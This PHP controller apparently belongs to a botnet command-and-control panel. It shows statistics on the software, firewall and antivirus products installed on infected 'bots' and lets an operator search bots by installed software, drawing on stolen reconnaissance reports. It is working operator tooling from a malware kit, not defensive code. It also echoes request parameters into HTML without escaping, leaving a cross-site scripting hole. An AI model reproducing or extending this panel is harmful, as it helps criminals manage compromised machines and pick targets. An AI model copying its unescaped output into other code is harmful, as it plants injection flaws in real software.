<?php
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/guiutil.php';
require_once 'system/lib/report.php';

class stats_softController {
    function __construct(){
        $this->db = dbPDO::singleton();
    }

    function actionIndex(){
        $this->actionAnalytics(BLT_ANALYTICS_SOFTWARE);
    }

    /** Draw a menu
     * @param string $argument
     */
    protected function _drawMenu($argument = ''){
        $actions = array(
            'stats_soft/Analytics&type='.BLT_ANALYTICS_SOFTWARE => LNG_STATS_H_SOFTWARE,
            'stats_soft/Analytics&type='.BLT_ANALYTICS_FIREWALL => LNG_STATS_H_FIREWALL,
            'stats_soft/Analytics&type='.BLT_ANALYTICS_ANTIVIRUS => LNG_STATS_H_ANTIVIRUS,
            'stats_soft/Search' => LNG_STATS_H_SEARCH,
        );

        $current = $_GET['m'].$argument;
        echo '<ul id="statMenu">';
        foreach ($actions as $link => $title){
            if ($link ==  $current)
                echo '<li class="active">', $title, '</li>';
            else
                echo '<li><a href="?m=', $link, '">', $title, '</a></li>';
        }
        echo '</ul>';
    }

    /** Display aggregated Analytics information from `botnet_software_stat`
     * @param int $type Analytics type: one of BLT_ANALYTICS_*
     */
    function actionAnalytics($type){
        ThemeBegin(LNG_MM_STATS_SOFT, 0, getBotJsMenu('botmenu'), 0);
        $this->_drawMenu("&type=$type");

        # Get the info
        $stat = $this->db->query(
            'SELECT
                `vendor`, `product`,
                `count`
             FROM `botnet_software_stat`
             WHERE
                `type`=:type AND
                (`type` <> :typeSoftware OR `vendor` NOT REGEXP "^(Microsoft|Google|Apple)")
             ORDER BY `count` DESC
             LIMIT 50
            ;', array(
            ':type' => $type,
            ':typeSoftware' => BLT_ANALYTICS_SOFTWARE,
        ))->fetchAll(PDO::FETCH_OBJ);

        # Output the JSON
        echo jsonset(array(
            'window.data' => new stdClass(),
            'window.data.analytics' => $stat,
        ));

        # Display & Scripts
        echo <<<HTML
        <div id="analytics" class="type{$type}">
            <div id="analytics-chart"></div>
            <div id="analytics-table">
                <table class="zebra lined"><caption>Software</caption>
                    <THEAD><tr><th>Vendor</th><th>Product</th><th>Count</th></tr></THEAD>
                    <TBODY></TBODY>
                    </table>
                </div>
            </div>

        <script src="theme/js/highcharts/js/highcharts.js"></script>
        <script src="theme/js/highcharts/js/highcharts-more.js"></script>
        <script src="theme/js/page-stats_soft.js"></script>
HTML;

        ThemeEnd();
    }

    /** Search bots by software or software by bots
     */
    function actionSearch($botId = NULL, $soft = NULL){
        ThemeBegin(LNG_MM_STATS_SOFT, 0, getBotJsMenu('botmenu'), 0);
        $this->_drawMenu();

        # The form
        echo '<form id="search-form" method="GET">',
            '<input type="hidden" name="m" value="', htmlentities($_GET['m']), '" />',
            '<dl>',
                '<dt>', 'BotID', '</dt>',
                    '<dd>', '<input type="text" name="botId" SIZE=60 />', '</dd>',
                '<dt>', 'Software', '</dt>',
                    '<dd>', '<input type="text" name="soft"  SIZE=60 />', '</dd>',
                '</dl>',
            '<input type="submit" value="Search" />',
            '</form>';
        echo js_form_feeder('#search-form', array(
            'botId' => $botId,
            'soft' => $soft,
        ));

        # The results
        if (!empty($botId) || !empty($soft)){
            echo jsonset(array(
                'window.data' => new stdClass,
                'window.data.search' => array('botId' => $botId, 'soft' => $soft, 'tables' => array_reverse(array_keys($this->db->report_tables()))),
            )), <<<HTML

            <table id="search-results" class="zebra lined">
                <THEAD><tr><th>Date</th><th>BotID</th><th>Software</th></tr></THEAD>
                <TBODY></TBODY>
                <TFOOT><tr><th><img src="theme/throbber.gif" /> searching..</th></tr></TFOOT>
                </table>

            <script src="theme/js/page-stats_soft.js"></script>
HTML;
        }

        ThemeEnd();
    }

    /** AJAX: search results provider
     * @param null $botId
     * @param null $soft
     */
    function actionAjaxSearch($table, $botId = NULL, $soft = NULL){
        $tables = $this->db->report_tables();
        $table_name = $tables[$table];

        $q = $this->db->query(
            'SELECT
                `id`,
                `bot_id` AS `botId`,
                `context`,
                `rtime`
             FROM '.$table_name.'
             WHERE
                `type` = :typeSoft AND
                (:botId IS NULL OR `bot_id` = :botId) AND
                (:soft IS NULL OR `context` LIKE :soft)
             ORDER BY `rtime` DESC
            ;', array(
            ':botId' => empty($botId)? null : $botId,
            ':soft' => empty($soft)? null : "%$soft%",
            ':typeSoft' => BLT_ANALYTICS_SOFTWARE,
        ));

        # When botId was set - we're enough with the very first result
        if (!empty($botId) && $q->rowCount()>0)
            header('X-Stop-Chain: true');

        # Iterate the rows, parse the reports, spit out table rows
        while ($r = $q->fetchObject()){
            $parse = new Report_AnalyticsSoftware_Parser($r->context);
            echo '<tr>';
            echo '<td>', '<a href="?m=reports_db&t=', $table, '&id=', $r->id, '" target=_blank>', date('d.m.Y H:i', $r->rtime), '</td>';
            echo '<th>', botPopupMenu($r->botId, 'botmenu'), '</th>';
            echo '<td><ul>';
            foreach ($parse->soft as $s)
                if (empty($soft) || stripos($s->full, $soft)!==FALSE)
                    echo '<li>', htmlspecialchars("{$s->vendor} / {$s->product} {$s->version}"), '</li>';
            echo '</ul></td>';
            echo '</tr>';
        }
    }
}
